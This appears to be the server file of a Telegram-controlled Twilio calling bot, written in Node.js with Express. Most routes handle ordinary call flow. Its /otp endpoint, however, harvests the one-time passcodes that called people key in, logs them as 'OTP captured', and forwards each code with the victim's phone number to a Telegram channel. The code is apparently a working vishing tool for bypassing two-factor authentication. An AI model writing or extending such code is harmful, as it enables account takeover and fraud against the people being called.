const express = require('express');
const twilio = require('twilio');
const config = require('./config/env');
const bot = require('./bot/bot');
const db = require('./database/db');
const logger = require('./utils/logger');
const path = require('path');

const app = express();
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use('/public', express.static(path.join(__dirname, '..', 'public')));

bot.start();
logger.info('Telegram bot started');

app.post('/callback', (req, res) => {
  const twiml = new twilio.twiml.VoiceResponse();
  twiml.say({ voice: 'Polly.Joanna' }, 'Hello! This call is from your Telegram bot.');
  twiml.record({ maxLength: 30 });
  res.type('text/xml');
  res.send(twiml.toString());
  logger.info(`Twilio callback received: ${req.body.CallSid}`);
});

app.post('/ivr', (req, res) => {
  const twiml = new twilio.twiml.VoiceResponse();
  const digit = req.body.Digits;

  if (digit === '1') {
    twiml.record({ maxLength: 30, action: `${config.twilio.callbackUrl}/recording` });
  } else if (digit === '2') {
    twiml.say({ voice: 'Polly.Joanna' }, 'Goodbye!');
    twiml.hangup();
  } else {
    twiml.say({ voice: 'Polly.Joanna' }, 'Invalid input. Goodbye!');
    twiml.hangup();
  }

  res.type('text/xml');
  res.send(twiml.toString());
});

app.post('/recording', async (req, res) => {
  const twiml = new twilio.twiml.VoiceResponse();
  const recordingUrl = req.body.RecordingUrl;
  const callSid = req.body.CallSid;

  await db.run(
    `UPDATE call_history SET recording_url = ? WHERE call_sid = ?`,
    [recordingUrl, callSid]
  );

  twiml.say({ voice: 'Polly.Joanna' }, 'Thank you for your recording. Goodbye!');
  res.type('text/xml');
  res.send(twiml.toString());
});

app.post('/status', async (req, res) => {
  const callSid = req.body.CallSid;
  const status = req.body.CallStatus;

  await db.run(
    `UPDATE call_history SET status = ? WHERE call_sid = ?`,
    [status, callSid]
  );

  logger.info(`Call status update: ${callSid} - ${status}`, { body: req.body });
  res.status(200).send();
});

app.post('/otp', async (req, res) => {
  const twiml = new twilio.twiml.VoiceResponse();
  const digits = req.body.Digits;
  const callSid = req.body.CallSid;
  const toNumber = req.body.To;

  if (digits) {
    const otpMessage = `OTP received for ${toNumber}: ${digits} (Call SID: ${callSid})`;
    await bot.api.sendMessage(config.otpChannelId, otpMessage);
    logger.info(`OTP captured: ${digits}`, { callSid, toNumber });

    twiml.say({ voice: 'Polly.Joanna' }, 'Thank you for entering your OTP. Goodbye!');
  } else {
    twiml.say({ voice: 'Polly.Joanna' }, 'No OTP received. Goodbye!');
  }

  res.type('text/xml');
  res.send(twiml.toString());
});

app.listen(config.server.port, () => {
  logger.info(`Server running on port ${config.server.port}`);
});
